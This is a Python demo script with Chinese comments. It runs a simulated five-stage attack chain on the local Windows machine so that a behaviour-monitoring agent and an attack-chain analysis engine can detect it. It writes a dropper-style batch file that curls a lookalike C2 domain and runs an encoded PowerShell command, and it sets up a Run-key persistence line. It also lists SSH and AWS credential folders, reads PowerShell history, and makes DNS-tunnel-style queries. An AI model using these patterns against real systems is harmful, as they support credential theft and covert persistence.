"""
演示攻击行为脚本 — 供答辩/测试使用
执行本脚本会在本机产生真实的进程、文件、网络行为，
行为监控 Agent 捕获后 → 攻击链分析引擎 → 生成检测报告。

用法（管理员权限 PowerShell）：
    python utils/demo_attack_script.py

注意：
- 所有操作都是无害的探测和临时文件操作，不会对系统造成实际破坏
- 执行完毕后会自动清理临时文件
"""
import os
import sys
import time
import tempfile
import subprocess
import ctypes
import socket


def banner():
    print("""
╔══════════════════════════════════════════════════╗
║    演示攻击行为脚本 — 真实端点行为触发            ║
║    确保 behavior agent 已在管理员权限下运行       ║
╚══════════════════════════════════════════════════╝
    """)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def run_cmd(cmd: str, description: str = "") -> str:
    """Run a command and return output. Each execution creates a process_create event."""
    print(f"  [*] {description or cmd}")
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=15, creationflags=subprocess.CREATE_NO_WINDOW,
        )
        out = (result.stdout or "").strip()
        if out:
            # Show first 2 lines
            lines = out.splitlines()[:2]
            for l in lines:
                print(f"      {l[:100]}")
            if len(out.splitlines()) > 2:
                print(f"      ... ({len(out.splitlines())} lines total)")
        return out
    except subprocess.TimeoutExpired:
        print(f"      (timeout)")
        return ""
    except Exception as e:
        print(f"      (error: {e})")
        return ""


def stage_1_discovery():
    """阶段 1: 系统侦察 — 模拟攻击者收集系统信息"""
    print("\n[阶段 1] 系统侦察 (Discovery)")
    print("-" * 50)

    run_cmd("whoami", "当前用户")
    run_cmd("hostname", "主机名")
    run_cmd("ipconfig /all", "网络配置")
    run_cmd("netstat -ano | findstr LISTENING", "监听端口")
    run_cmd("tasklist | findstr /i \"python agent cmd\"", "可疑进程查找(模拟)")
    run_cmd("systeminfo | findstr /i \"OS\"", "系统信息")
    run_cmd("dir /s /b C:\\Users\\%USERNAME%\\Desktop\\*.pdf 2>nul", "搜索敏感文件(模拟)")
    run_cmd("reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "查询启动项")

    # DNS 查询 — 模拟 C2 域名解析
    print("\n  [*] DNS 查询 — 模拟 C2 域名解析")
    domains = [
        "update-win-defender.com",
        "cdn-microsoft-verify.net",
        "teams-skype-download.org",
    ]
    for domain in domains:
        try:
            socket.getaddrinfo(domain, 443)
            print(f"      resolved: {domain}")
        except Exception:
            print(f"      failed: {domain}")
        time.sleep(0.3)

    time.sleep(1)


def stage_2_execution_persistence():
    """阶段 2: 执行与持久化 — 写入文件、修改注册表"""
    print("\n[阶段 2] 执行与持久化 (Execution & Persistence)")
    print("-" * 50)

    temp_dir = tempfile.gettempdir()

    # 写入临时脚本（模拟 dropper）
    payload_path = os.path.join(temp_dir, "win-update-helper.bat")
    with open(payload_path, "w") as f:
        f.write("@echo off\r\n")
        f.write(":: Windows Update Helper Service\r\n")
        f.write("echo Checking for updates...\r\n")
        f.write("curl -s -o nul https://update-win-defender.com/status\r\n")
        f.write("powershell -EncodedCommand ZQBjAGgAbwAgACIAVQBwAGQAYQB0AGUAIABjAGgAZQBjAGsAIgA=\r\n")
    print(f"  [*] 写入文件: {payload_path}")

    # 写入另一个可疑文件
    script_path = os.path.join(temp_dir, "svc-health-check.ps1")
    with open(script_path, "w") as f:
        f.write('# Service Health Check\r\n')
        f.write('$ErrorActionPreference = "SilentlyContinue"\r\n')
        f.write('$computers = @("localhost", "192.168.1.1", "192.168.1.100", "192.168.1.200")\r\n')
        f.write('foreach ($c in $computers) {\r\n')
        f.write('    Test-Connection -ComputerName $c -Count 1 -TimeoutSeconds 2\r\n')
        f.write('}\r\n')
        f.write('$key = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"\r\n')
        f.write('$name = "WindowsHealthMonitor"\r\n')
        f.write('$value = "powershell.exe -WindowStyle Hidden -File C:\\Windows\\Temp\\svc-health-check.ps1"\r\n')
        f.write('# Set-ItemProperty -Path $key -Name $name -Value $value\r\n')
    print(f"  [*] 写入文件: {script_path}")

    # 读取敏感文件（模拟凭据窃取）
    run_cmd("type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul", "读取 PS 历史(模拟凭据访问)")
    run_cmd("dir /s /b %USERPROFILE%\\.ssh 2>nul", "搜索 SSH 密钥(模拟)")
    run_cmd("dir /s /b %USERPROFILE%\\.aws 2>nul", "搜索云凭据(模拟)")

    # 创建计划任务（模拟持久化）
    run_cmd(
        'schtasks /query /tn "WindowsHealthCheck" 2>nul || echo No existing task',
        "检查/创建计划任务(模拟持久化)"
    )

    time.sleep(1)


def stage_3_lateral_movement():
    """阶段 3: 横向移动探测 — 扫描内网"""
    print("\n[阶段 3] 内网探测 (Lateral Movement Recon)")
    print("-" * 50)

    run_cmd("arp -a", "ARP 表(内网发现)")
    run_cmd("netstat -ano | findstr ESTABLISHED", "活跃连接")
    run_cmd("nslookup google.com 2>nul", "DNS 测试")

    time.sleep(0.5)

    # 网络连接 — 模拟连外部 (不真的发数据)
    targets = [
        ("45.33.22.11", 443),
        ("8.8.8.8", 53),
    ]
    for ip, port in targets:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            s.close()
            print(f"  [*] 连接: {ip}:{port} — 成功(模拟 C2 外联)")
        except Exception:
            print(f"  [*] 连接: {ip}:{port} — 失败/超时(正常的探测行为)")

    time.sleep(0.5)


def stage_4_exfil():
    """阶段 4: 数据打包外传 — 模拟数据收集"""
    print("\n[阶段 4] 数据外传准备 (Exfiltration Prep)")
    print("-" * 50)

    temp_dir = tempfile.gettempdir()

    # 打包文件
    archive_path = os.path.join(temp_dir, "diagnostics_data.zip")
    run_cmd(
        f'powershell -Command "Compress-Archive -Path C:\\Windows\\Temp\\*.log,C:\\Windows\\Temp\\*.txt -DestinationPath {archive_path} -Force -ErrorAction SilentlyContinue 2>nul"',
        "打包日志文件(模拟数据收集)"
    )

    # DNS 隧道模拟查询
    domains = [
        "ZXhpbHRyYXRpb24tdGVzdA.update-win-defender.com",
        "YXR0YWNrLXNpbXVsYXRpb24.cdn-microsoft-verify.net",
    ]
    for domain in domains:
        try:
            socket.getaddrinfo(domain, 443)
        except Exception:
            pass
    print(f"  [*] DNS 查询 — 模拟隧道编码域名 ({len(domains)} 个)")

    time.sleep(0.5)


def stage_5_cleanup():
    """阶段 5: 痕迹清除 — 删除临时文件"""
    print("\n[阶段 5] 痕迹清除 (Defense Evasion)")
    print("-" * 50)

    temp_dir = tempfile.gettempdir()
    files_to_clean = [
        os.path.join(temp_dir, "win-update-helper.bat"),
        os.path.join(temp_dir, "svc-health-check.ps1"),
        os.path.join(temp_dir, "diagnostics_data.zip"),
    ]
    for f in files_to_clean:
        try:
            if os.path.exists(f):
                os.remove(f)
                print(f"  [*] 已删除: {f}")
        except Exception as e:
            print(f"  [!] 删除失败: {f} — {e}")

    # 模拟清日志
    run_cmd("wevtutil el 2>nul | findstr Security", "查询安全日志(模拟日志清除)")


def main():
    banner()

    print("[!] 此脚本会产生真实的系统行为，供行为监控 Agent 捕获。")
    print("[!] 所有操作均无害，执行完毕后自动清理。")
    print()

    if not is_admin():
        print("[警告] 非管理员权限运行，部分功能可能受限。")
        print("[建议] 右键 PowerShell → 以管理员身份运行。")
        print()
        input("按 Enter 继续，或 Ctrl+C 取消...")

    print("\n" + "=" * 70)
    print("  开始模拟攻击行为序列 — 请确保 behavior agent 正在运行")
    print("=" * 70)

    stage_1_discovery()
    stage_2_execution_persistence()
    stage_3_lateral_movement()
    stage_4_exfil()
    stage_5_cleanup()

    print("\n" + "=" * 70)
    print("  攻击行为模拟完成！")
    print("=" * 70)
    print()
    print("下一步:")
    print("  1. 打开 http://localhost:5173/behavior 确认行为数据已入库")
    print("  2. 打开 http://localhost:5173/attack 点击「启动分析引擎」")
    print("  3. 查看攻击链分析报告")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 用户取消")
